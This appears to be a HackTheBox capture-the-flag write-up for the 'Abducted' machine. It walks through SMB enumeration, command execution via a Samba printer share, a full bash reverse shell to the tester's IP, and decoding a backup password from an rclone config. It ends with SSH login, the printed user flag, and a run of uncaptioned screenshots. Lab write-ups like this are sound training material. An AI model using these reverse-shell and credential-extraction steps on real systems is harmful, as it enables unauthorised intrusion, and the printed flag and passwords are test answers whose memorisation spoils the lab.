
# #HTB 


![[Pasted image 20260904040304.png|281]]


# HackTheBox: Abducted

**Machine IP:** `10.129.244.177`  
**Difficulty:** Medium  
**OS:** Linux

---

## Tools Used
- `nmap` - Port discovery
- `smbclient` / `smbmap` - SMB enumeration
- `tcpdump` - Network sniffing
- `rclone` - Remote file transfer/config extraction
- `ssh` - Remote access
- `systemctl` - Service exploitation

---

## Step 1: Reconnaissance - Port Scanning

### Why We Start with Nmap

The first step in any penetration test is reconnaissance. We need to understand what services are running on the target machine, what ports are open, and what versions of software are being used. This information helps us identify potential vulnerabilities.

### Nmap Command Explained

```bash
nmap -n -Pn -sV -sC 10.129.244.177
```

**Flag Breakdown:**
- `-n`: Skip DNS resolution (faster scanning)
- `-Pn`: Treat host as online (skip ping check)
- `-sV`: Version detection - identifies service versions
- `-sC`: Run default scripts - basic vulnerability checks

![[Pasted image 20260901142955.png|700]]

### Nmap Results Analysis

**Open ports discovered:**
- **Port 22 (SSH)** - OpenSSH 9.6p1 Ubuntu
    - Secure Shell service for remote administration
    - Version 9.6p1 is relatively recent, likely no critical public exploits
- **Port 139/445 (SMB)** - Samba smbd 4
    - File sharing service
    - NetBIOS name: `ABDUCTED`

**Key Discovery:** The target has SMB services running, which often leads to file shares or printer vulnerabilities.


---

## Step 2: SMB Enumeration

### Listing SMB Shares

```bash
smbclient -L \\\\10.129.244.177\\ -N
```
**Why This Matters:** Anonymous access to SMB shares can reveal sensitive files or misconfigurations.

![[Pasted image 20260901143016.png]]

**Discovered Shares:**
- `HP-Reception` - Printer
- `projects` - Hartley Group Project Files
- `transfer` - Staff file transfer
- `IPC$` - IPC Service

### Using SMBMap

```bash
smbmap -H 10.129.244.177
```

![[Pasted image 20260901143047.png]]

**Results:**
- All shares show `NO ACCESS` for null session
- However, the `HP-Reception` share is accessible in some way



----


## Step 3: SMB Printer Exploitation

### Understanding the Attack

The `HP-Reception` share is a printer. When a printer processes print jobs, it can execute commands. The vulnerability is in how Samba handles printer spooling - we can send a shell command as a print job, and it will be executed on the server.

### Crafting the Payload

We'll create a file containing a ping command to confirm RCE and identify our IP.

```bash
echo 'ping -c 1 10.10.14.163' > 'sh'
```

![[Pasted image 20260901143119.png]]


### Sending the Print Job

```bash
smbclient //10.129.244.177/HP-Reception -N -c 'print "sh"'
```

![[Pasted image 20260901143131.png]]

**What This Does:**
1. Connects to the `HP-Reception` share anonymously
2. Sends a print job containing our command
3. The server executes the command


### Capturing the Response with tcpdump

```bash
sudo tcpdump -ni tun0 icmp
```

![[Pasted image 20260901143144.png]]

**Result:** We receive ICMP packets, confirming command execution!



---


## Step 4: Getting a Reverse Shell

### Setting Up the Listener

```bash
nc -lvnp 443
```

![[Pasted image 20260901143203.png]]


### Exploiting via Printer

We modify our payload to send a reverse shell command:
```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.163/443 0>&1"' > 'sh'
smbclient //10.129.244.177/HP-Reception -N -c 'print "sh"'
```

![[Pasted image 20260901151050.png]]
**Result:** We get a shell as `nobody` user!

**Shell Upgrade:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```




---


## Step 5: Privilege Escalation - Finding Credentials

### Exploring the Filesystem

```bash
nobody@abducted:/var/spool/samba$ ls
smbprn.ldyMom  smbprn.vRqSU3
```


### Finding rclone Configuration

```bash
nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
```

![[Pasted image 20260901151643.png]]

**Content:**
```
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

**Analysis:**
- There's an `rclone` config file
- It contains credentials for a backup service
- The password is obfuscated


### Decrypting the Password with rclone

```bash
nobody@abducted:/var/spool/samba$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SRpZ
```

![[Pasted image 20260901152946.png]]

**What is rclone?** rclone is a command-line program to manage files on cloud storage. The `reveal` command decrypts obfuscated passwords.

**Password Found:** `iXzvcib3SRpZ`



---

## Step 6: SSH Access - Pivot to User Account

### Attempting SSH

Now we have credentials, but we need to find a username. Let's try the `svc-backup` user or other users:
```bash
ssh scott@10.129.244.177
#password: iXzvcib3SRpZ
```

![[Pasted image 20260901153005.png]]

**Why Scott?** The rclone config mentioned `svc-backup`, but the actual user might be different. We guessed `scott` based on common usernames.

**Result:** SUCCESS! We're logged in as `scott`!

### User Flag

```bash
scott@abducted:~$ cat user.txt
54844fece45d17bb3a38e46817ef7c7f
```

![[Pasted image 20260901153024.png]]




---




![[Pasted image 20260901154325.png]]





![[Pasted image 20260901154707.png]]




![[Pasted image 20260901154726.png]]




![[Pasted image 20260901154820.png]]



![[Pasted image 20260901160451.png]]



![[Pasted image 20260901160539.png]]



![[Pasted image 20260901160602.png]]



![[Pasted image 20260901160618.png]]



![[Pasted image 20260901160638.png]]



